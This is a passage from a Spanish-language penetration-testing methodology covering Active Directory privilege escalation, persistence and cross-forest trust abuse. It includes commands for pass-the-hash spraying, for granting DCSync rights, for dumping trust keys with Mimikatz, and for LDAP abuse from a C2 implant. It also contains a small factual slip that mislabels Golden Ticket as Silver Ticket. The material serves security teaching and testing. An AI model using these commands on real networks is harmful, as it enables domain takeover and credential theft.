Con credenciales de dominio o una sesión de usuario, vuelve a revisar los [**ataques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) de NTLM: las técnicas de enumeración autenticada y coerción pueden revelar rutas de relay que no estaban disponibles durante el reconocimiento sin autenticar.

### Buscar credenciales en recursos compartidos de equipos | Recursos compartidos SMB

Ahora que tienes algunas credenciales básicas, deberías comprobar si puedes **encontrar** **archivos interesantes compartidos dentro de AD**. Podrías hacerlo manualmente, pero es una tarea muy aburrida y repetitiva (más aún si encuentras cientos de documentos que tienes que revisar).

[**Sigue este enlace para conocer las herramientas que puedes usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Robar credenciales NTLM

Si puedes **acceder a otros PC o recursos compartidos**, podrías **colocar archivos** (como un archivo SCF) que, si alguien accede a ellos, **desencadenen una autenticación NTLM contra ti** para que puedas **robar** el **desafío NTLM** y descifrarlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía que cualquier usuario autenticado **comprometiera el controlador de dominio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalada de privilegios en Active Directory CON credenciales/sesión privilegiadas

**Para las siguientes técnicas, no basta con ser un usuario de dominio común; necesitas privilegios o credenciales especiales para realizar estos ataques.**

### Extracción de hashes

Con suerte, has conseguido **comprometer alguna cuenta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluido el relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilegios localmente](../windows-local-privilege-escalation/index.html).\
Luego, es hora de volcar todos los hashes de la memoria y del sistema local.\
[**Lee esta página sobre las diferentes formas de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tienes el hash de un usuario**, puedes usarlo para **suplantar su identidad**.\
Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** puedes crear un nuevo **sessionlogon** e **inyectar** ese **hash** en **LSASS**, de modo que se use ese **hash cuando se realice cualquier autenticación NTLM**. Esta última opción es lo que hace mimikatz.\
[**Lee esta página para obtener más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque busca **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al método habitual Pass The Hash mediante el protocolo NTLM. Por lo tanto, puede ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo se permite **Kerberos** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o sus hashes. Luego, usan este ticket robado para **suplantar al usuario** y obtener acceso no autorizado a recursos y servicios de la red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilización de credenciales

Si tienes el **hash** o la **contraseña** de un **administrador local**, deberías intentar **iniciar sesión localmente** en otros **PC** con ellos.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Ten en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### Abuso de MSSQL y enlaces de confianza

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría usarlos para **ejecutar comandos** en el host MSSQL (si se ejecuta como SA), **robar** el **hash** NetNTLM o incluso realizar un **ataque** de **relay**.\
Si una instancia MSSQL es de confianza para otra instancia a través de un enlace de base de datos, un usuario con privilegios sobre la base de datos enlazada podría **usar la relación de confianza para ejecutar consultas en la otra instancia**. Estas relaciones de confianza se pueden encadenar y, eventualmente, podrían llevar a una base de datos mal configurada donde el usuario pueda ejecutar comandos.\
**Los enlaces entre bases de datos funcionan incluso a través de relaciones de confianza entre bosques.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de implementación y gestión de activos de TI

Las suites de inventario e implementación de terceros suelen exponer vías de acceso potentes a credenciales y a la ejecución de código. Consulta:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás extraer de la memoria los TGT de todos los usuarios que inicien sesión en él.\
Por lo tanto, si un **Domain Admin inicia sesión en el equipo**, podrás extraer su TGT e impersonarlo mediante [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation, incluso podrías **comprometer automáticamente un servidor de impresión** (con suerte, será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un usuario o equipo tiene habilitada la "Constrained Delegation", podrá **impersonar a cualquier usuario para acceder a ciertos servicios en un equipo**.\
Por lo tanto, si **comprometes el hash** de este usuario/equipo, podrás **impersonar a cualquier usuario** (incluso a domain admins) para acceder a ciertos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegios de **WRITE** sobre un objeto de Active Directory de un equipo remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de permisos/ACL

El usuario comprometido podría tener algunos **privilegios interesantes sobre ciertos objetos del dominio** que podrían permitirte **moverte** lateralmente o **escalar** privilegios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso del servicio Printer Spooler

Encontrar un **servicio Spooler escuchando** en el dominio puede **aprovecharse** para **obtener nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sesiones de terceros

Si **otros usuarios** **acceden** al equipo **comprometido**, es posible **obtener credenciales de la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente, los usuarios accederán al sistema mediante RDP. Aquí tienes un par de ataques que puedes realizar contra sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del administrador local** en equipos unidos al dominio, garantizando que sea **aleatoria**, única y que se **cambie** con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACL para permitirlo solo a usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Robo de certificados

Para obtener información sobre la inscripción en AD CS, la asignación de certificados y la enumeración antes de intentar robar certificados o abusar de plantillas, consulta la [descripción general de los certificados de AD](ad-certificates.md).

**Obtener certificados** del equipo comprometido podría ser una forma de escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de plantillas de certificados

Si hay **plantillas vulnerables** configuradas, es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation con una cuenta con privilegios elevados

### Extracción de credenciales del dominio

Una vez que obtengas privilegios de **Domain Admin** o, mejor aún, de **Enterprise Admin**, podrás **extraer** la **base de datos del dominio**: _ntds.dit_.

[**Puedes encontrar más información sobre el ataque DCSync aquí**](dcsync.md).

[**Puedes encontrar más información sobre cómo robar el NTDS.dit aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Un archivo de copia de seguridad legible que contenga `ntds.dit` junto con el hive `SYSTEM` debe tratarse como material del directorio expuesto incluso antes de extraerlo. Un hash de contraseña obsoleto no hace que otros atributos del objeto sean seguros: campos como `description` pueden contener credenciales o notas operativas. Inspecciona primero los nombres de los miembros del archivo y evita incluir el contenido extraído de la base de datos en los resultados de enumeración rutinarios.

### Privesc como persistencia

Algunas de las técnicas mencionadas anteriormente pueden usarse para persistencia.\
Por ejemplo, podrías:

- Hacer que los usuarios sean vulnerables a [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Hacer que los usuarios sean vulnerables a [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Conceder privilegios de [**DCSync**](#dcsync) a un usuario

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

El **ataque Silver Ticket** crea un **ticket legítimo de Ticket Granting Service (TGS)** para un servicio específico mediante el uso del **hash NTLM** (por ejemplo, el **hash de la cuenta del PC**). Este método se utiliza para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **ataque Golden Ticket** consiste en que un atacante obtiene acceso al **hash NTLM de la cuenta krbtgt** en un entorno de Active Directory (AD). Esta cuenta es especial porque se utiliza para firmar todos los **Ticket Granting Tickets (TGT)**, que son esenciales para autenticarse en la red de AD.

Una vez que el atacante obtiene este hash, puede crear **TGT** para cualquier cuenta que elija (ataque Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son similares a los golden tickets, pero se falsifican de una manera que **elude los mecanismos habituales de detección de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistencia de cuentas con certificados**

**Tener certificados de una cuenta o poder solicitarlos** es una muy buena forma de mantener la persistencia en la cuenta de un usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistencia de dominio con certificados**

**También es posible usar certificados para mantener la persistencia con privilegios elevados dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

El objeto **AdminSDHolder** de Active Directory garantiza la seguridad de los **grupos con privilegios** (como Domain Admins y Enterprise Admins) aplicando una **lista de control de acceso (ACL)** estándar a estos grupos para evitar cambios no autorizados. Sin embargo, esta función puede explotarse: si un atacante modifica la ACL de AdminSDHolder para otorgar acceso total a un usuario normal, este obtiene un amplio control sobre todos los grupos con privilegios. Por tanto, esta medida de seguridad, cuyo propósito es proteger, puede resultar contraproducente y permitir accesos indebidos si no se supervisa de cerca.

[**Más información sobre el grupo AdminDSHolder aquí.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciales DSRM

En cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Al obtener derechos de administrador en una máquina de este tipo, se puede extraer el hash del administrador local mediante **mimikatz**. Después, es necesario modificar el registro para **habilitar el uso de esta contraseña**, lo que permite el acceso remoto a la cuenta de administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistencia mediante ACL

Se pueden **otorgar** **permisos especiales** a un **usuario** sobre determinados objetos del dominio, lo que le permitirá **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descriptores de seguridad

Los **descriptores de seguridad** se usan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes hacer un **pequeño cambio** en el **descriptor de seguridad** de un objeto, puedes obtener privilegios muy interesantes sobre él sin necesidad de pertenecer a un grupo con privilegios.


{{#ref}}
security-descriptors.md
{{#endref}}

### Antiforense / evasión mediante objetos dinámicos

Abusa de la clase auxiliar `dynamicObject` para crear principales/GPO/registros DNS de corta duración con `entryTTL`/`msDS-Entry-Time-To-Die`; se eliminan solos sin dejar tombstones, borrando evidencias LDAP y dejando SIDs huérfanos, referencias `gPLink` rotas o respuestas DNS almacenadas en caché (por ejemplo, contaminación de ACE de AdminSDHolder o redirecciones maliciosas de `gPCFileSysPath`/DNS integrado en AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** en memoria para establecer una **contraseña universal**, que permite acceder a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personalizado

[Aprende aquí qué es un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar en texto claro** las **credenciales** utilizadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en AD y lo utiliza para **insertar atributos** (SIDHistory, SPNs...) en objetos específicos **sin** dejar **registros** de las **modificaciones**. Se necesitan privilegios de **DA** y estar dentro del **dominio raíz**.\
Ten en cuenta que, si usas datos incorrectos, aparecerán registros bastante llamativos.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistencia mediante LAPS

Anteriormente explicamos cómo escalar privilegios si tienes **permisos suficientes para leer las contraseñas de LAPS**. Sin embargo, estas contraseñas también se pueden usar para **mantener la persistencia**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Escalada de privilegios en el bosque: confianzas de dominio

Microsoft considera el **Forest** el límite de seguridad. Esto implica que **comprometer un solo dominio podría llevar potencialmente a comprometer todo el Forest**.<sup>[[1]](#references)</sup>

### Información básica

Una [**confianza de dominio**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos de otro **dominio**. Básicamente, crea un vínculo entre los sistemas de autenticación de ambos dominios, lo que permite que las verificaciones de autenticación se realicen sin interrupciones. Cuando los dominios establecen una confianza, intercambian y conservan determinadas **claves** en sus **Domain Controllers (DC)**, esenciales para la integridad de la confianza.

En una situación típica, si un usuario quiere acceder a un servicio en un **dominio de confianza**, primero debe solicitar un ticket especial, conocido como **TGT entre reinos**, al DC de su propio dominio. Este TGT se cifra con una **clave** compartida que ambos dominios han acordado. A continuación, el usuario presenta este TGT al **DC del dominio de confianza** para obtener un ticket de servicio (**TGS**). Si el DC del dominio de confianza valida correctamente el TGT entre reinos, emite un TGS que permite al usuario acceder al servicio.

**Pasos**:

1. Un **equipo cliente** del **Dominio 1** inicia el proceso usando su **hash NTLM** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. Si el cliente se autentica correctamente, DC1 emite un nuevo TGT.
3. A continuación, el cliente solicita a DC1 un **TGT entre reinos**, necesario para acceder a los recursos del **Dominio 2**.
4. El TGT entre reinos se cifra con una **clave de confianza** que DC1 y DC2 comparten como parte de la confianza bidireccional entre los dominios.
5. El cliente lleva el TGT entre reinos al **Domain Controller del Dominio 2 (DC2)**.
6. DC2 verifica el TGT entre reinos mediante la clave de confianza compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor del Dominio 2 al que el cliente quiere acceder.
7. Finalmente, el cliente presenta este TGS al servidor, que está cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio del Dominio 2.

### Tipos de confianza

Es importante tener en cuenta que **una confianza puede ser unidireccional o bidireccional**. En las relaciones bidireccionales, ambos dominios confían entre sí; en una relación **unidireccional**, uno de los dominios será el **dominio de confianza** y el otro, el **dominio que confía**. En este último caso, **solo podrás acceder a los recursos del dominio que confía desde el dominio de confianza**.

Si el Dominio A confía en el Dominio B, A es el dominio que confía y B es el dominio de confianza. Además, en el **Dominio A**, esta sería una **confianza saliente**; y en el **Dominio B**, una **confianza entrante**.

**Diferentes relaciones de confianza**

- **Confianzas entre padre e hijo**: Es una configuración habitual dentro del mismo forest, donde un dominio hijo tiene automáticamente una confianza transitiva bidireccional con su dominio padre. Esto significa que las solicitudes de autenticación pueden fluir sin interrupciones entre el padre y el hijo.
- **Confianzas de enlace cruzado**: También llamadas «confianzas de acceso directo», se establecen entre dominios hijo para acelerar los procesos de referencia. En los forests complejos, las referencias de autenticación suelen tener que subir hasta la raíz del forest y luego bajar hasta el dominio de destino. Al crear enlaces cruzados, se acorta el recorrido, lo que resulta especialmente útil en entornos con una distribución geográfica amplia.
- **Confianzas externas**: Se establecen entre dominios diferentes y no relacionados, y por naturaleza no son transitivas. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), las confianzas externas son útiles para acceder a recursos de un dominio fuera del forest actual que no está conectado mediante una confianza de forest. El filtrado de SID refuerza la seguridad de las confianzas externas.
- **Confianzas de raíz de árbol**: Se establecen automáticamente entre el dominio raíz del forest y una nueva raíz de árbol que se agregue. Aunque no son muy habituales, son importantes para agregar nuevos árboles de dominio a un forest, permitirles mantener un nombre de dominio único y garantizar la transitividad bidireccional. Puedes encontrar más información en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Confianzas de forest**: Este tipo de confianza es bidireccional y transitiva entre dos dominios raíz de forest, y también aplica el filtrado de SID para reforzar la seguridad.
- **Confianzas MIT**: Se establecen con dominios Kerberos que no son Windows y cumplen con [RFC4120](https://tools.ietf.org/html/rfc4120). Las confianzas MIT son más especializadas y están orientadas a entornos que requieren integrarse con sistemas basados en Kerberos ajenos al ecosistema de Windows.

#### Otras diferencias en las **relaciones de confianza**

- Una relación de confianza también puede ser **transitiva** (A confía en B, B confía en C, entonces A confía en C) o **no transitiva**.
- Una relación de confianza puede configurarse como **bidireccional** (ambos confían entre sí) o **unidireccional** (solo uno confía en el otro).

### Vía de ataque

1. **Enumera** las relaciones de confianza.
2. Comprueba si algún **principal de seguridad** (usuario/grupo/equipo) tiene **acceso** a recursos del **otro dominio**, quizá mediante entradas ACE o por pertenecer a grupos del otro dominio. Busca **relaciones entre dominios** (probablemente la confianza se creó para eso).
   1. En este caso, kerberoast podría ser otra opción.
3. **Compromete** las **cuentas** que puedan **pivotar** entre dominios.

Los atacantes que pueden acceder a recursos de otro dominio pueden hacerlo mediante tres mecanismos principales:

- **Pertenencia a grupos locales**: Los principales pueden añadirse a grupos locales de las máquinas, como el grupo «Administrators» de un servidor, lo que les otorga un control considerable sobre esa máquina.
- **Pertenencia a grupos de dominios externos**: Los principales también pueden pertenecer a grupos del dominio externo. Sin embargo, la eficacia de este método depende de la naturaleza de la confianza y del ámbito del grupo.
- **Listas de control de acceso (ACL)**: Los principales pueden especificarse en una **ACL**, en particular como entidades en **ACE** dentro de una **DACL**, lo que les da acceso a recursos específicos. Para profundizar en el funcionamiento de las ACL, las DACL y las ACE, el whitepaper titulado «[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)» es un recurso muy valioso.<sup>[[17]](#references)</sup>

### Buscar usuarios/grupos externos con permisos

Puedes comprobar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar principales de seguridad externos en el dominio. Estos serán usuarios/grupos de **un dominio/forest externo**.

Puedes comprobarlo en **Bloodhound** o mediante powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Otras formas de enumerar las relaciones de confianza del dominio:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Hay **2 claves de confianza**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes obtener la que utiliza el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar como Enterprise admin al dominio hijo/padre abusando de la confianza mediante SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Explotar Configuration NC con permisos de escritura

Es crucial comprender cómo se puede explotar el Configuration Naming Context (NC). El Configuration NC funciona como un repositorio central de datos de configuración en los entornos de Active Directory (AD) de un forest. Estos datos se replican en todos los Domain Controllers (DC) del forest, y los DC con permisos de escritura mantienen una copia editable del Configuration NC. Para explotarlo, se necesitan **privilegios SYSTEM en un DC**, preferiblemente en un DC hijo.

**Vincular GPO al sitio del DC raíz**

El contenedor Sites del Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del forest de AD. Con privilegios SYSTEM en cualquier DC, los atacantes pueden vincular GPO a los sitios del DC raíz. Esta acción puede comprometer el dominio raíz al manipular las políticas aplicadas a esos sitios.

Para obtener información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometer cualquier gMSA del forest**

Un vector de ataque consiste en apuntar a gMSA con privilegios en el dominio. La clave raíz KDS, esencial para calcular las contraseñas de las gMSA, se almacena en el Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la clave raíz KDS y calcular las contraseñas de cualquier gMSA del forest.

El análisis detallado y las instrucciones paso a paso están disponibles en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementario a MSA delegadas (BadSuccessor – abuso de atributos de migración):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Ataque mediante cambios en el Schema**

Este método requiere paciencia: hay que esperar a que se creen nuevos objetos de AD con privilegios. Con privilegios SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control total sobre todas las clases. Esto podría permitir el acceso no autorizado y el control de los objetos de AD que se creen posteriormente.

Hay más información en [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA a EA con ADCS ESC5**

La vulnerabilidad ADCS ESC5 permite tomar el control de objetos de Public Key Infrastructure (PKI) para crear una plantilla de certificado que permita autenticarse como cualquier usuario del forest. Como los objetos PKI residen en el Configuration NC, comprometer un DC hijo con permisos de escritura permite ejecutar ataques ESC5.

Puedes leer más detalles en [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> En entornos sin ADCS, el atacante puede configurar los componentes necesarios, como se explica en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Dominio de un forest externo: unidireccional (entrante) o bidireccional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

En este escenario, **tu dominio es de confianza** para un dominio externo, que te concede **permisos indeterminados** sobre él. Tendrás que averiguar **qué principales de tu dominio tienen acceso al dominio externo y qué nivel de acceso tienen**, y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de bosque externo - Unidireccional (saliente)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

En este escenario, **tu dominio** está **confiando** algunos **privilegios** a un principal de **otros dominios**.

Sin embargo, cuando un **dominio es de confianza** para el dominio que confía, el dominio de confianza **crea un usuario** con un **nombre predecible** que usa como **contraseña la contraseña de confianza**. Esto significa que es posible **acceder a un usuario del dominio que confía para entrar en el de confianza**, enumerarlo e intentar escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio de confianza es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** a la confianza del dominio (algo que no es muy común).

Otra forma de comprometer el dominio de confianza es esperar en una máquina a la que un **usuario del dominio de confianza pueda acceder** para iniciar sesión mediante **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder desde allí al dominio de origen de la víctima**.\
Además, si la **víctima montó su disco duro**, el atacante podría almacenar **backdoors** en la **carpeta de inicio del disco duro** desde el proceso de la **sesión RDP**. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de confianza entre dominios

### **Filtrado de SID:**

- El riesgo de ataques que aprovechan el atributo SID history a través de confianzas entre bosques se mitiga mediante SID Filtering, que está activado por defecto en todas las confianzas entre bosques. Esto se basa en la suposición de que las confianzas dentro de un bosque son seguras, considerando el bosque, y no el dominio, como límite de seguridad, según la postura de Microsoft.
- Sin embargo, hay una salvedad: el filtrado de SID podría interrumpir aplicaciones y el acceso de los usuarios, lo que lleva a que a veces se desactive.

### **Autenticación selectiva:**

- En las confianzas entre bosques, el uso de Selective Authentication garantiza que los usuarios de ambos bosques no se autentiquen automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o bosque que confía.
- Es importante tener en cuenta que estas medidas no protegen contra la explotación del contexto de nomenclatura de configuración (NC) con permisos de escritura ni contra los ataques a la cuenta de confianza.

[**Más información sobre las confianzas entre dominios en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD basado en LDAP desde implantes en el host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) vuelve a implementar primitivas LDAP al estilo de bloodyAD como Beacon Object Files x64 que se ejecutan completamente dentro de un implante en el host (p. ej., Adaptix C2). Los operadores compilan el paquete con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs` y luego ejecutan `ldap <subcommand>` desde el beacon. Todo el tráfico usa el contexto de seguridad del inicio de sesión actual mediante LDAP (389) con firma/cifrado o LDAPS (636) con confianza automática en certificados, por lo que no se necesitan proxies SOCKS ni artefactos en disco.<sup>[[4]](#references)</sup>

### Enumeración LDAP desde el implante

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` y `get-groupmembers` resuelven nombres cortos/rutas de OU en DN completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute` y `get-domaininfo` obtienen atributos arbitrarios (incluidos descriptores de seguridad), además de los metadatos del bosque/dominio de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` y `get-rbcd` muestran candidatos para roasting, configuraciones de delegación y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directamente desde LDAP.
- `get-acl` y `get-writable --detailed` analizan la DACL para enumerar los trustees, los permisos (GenericAll/WriteDACL/WriteOwner/escrituras de atributos) y la herencia, y proporcionan objetivos inmediatos para la escalada de privilegios mediante ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitivas de escritura LDAP para escalada y persistencia

- Los BOFs de creación de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador crear nuevas identidades o cuentas de equipo en cualquier ubicación donde existan permisos de OU. `add-groupmember`, `set-password`, `add-attribute` y `set-attribute` permiten secuestrar directamente los objetivos cuando se encuentran permisos de escritura de propiedades.
- Los comandos centrados en ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` y `add-dcsync`, convierten WriteDACL/WriteOwner sobre cualquier objeto de AD en restablecimientos de contraseñas, control de pertenencia a grupos o privilegios de replicación DCSync, sin dejar artefactos de PowerShell/ADSI. Los comandos `remove-*` correspondientes limpian las ACE inyectadas.

### Delegación, roasting y abuso de Kerberos

- `add-spn`/`set-spn` hacen que un usuario comprometido sea inmediatamente vulnerable a Kerberoast; `add-asreproastable` (cambio de UAC) lo marca para AS-REP roasting sin modificar la contraseña.
- Las macros de delegación (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modifican `msDS-AllowedToDelegateTo`, los indicadores de UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, lo que habilita rutas de ataque de delegación constrained/unconstrained/RBCD y elimina la necesidad de usar PowerShell remoto o RSAT.

### Inyección de sidHistory, reubicación de OU y configuración de la superficie de ataque

- `add-sidhistory` inyecta SID privilegiados en el historial de SID de una identidad controlada (consulta [SID-History Injection](sid-history-injection.md)), lo que proporciona herencia de acceso sigilosa mediante LDAP/LDAPS.
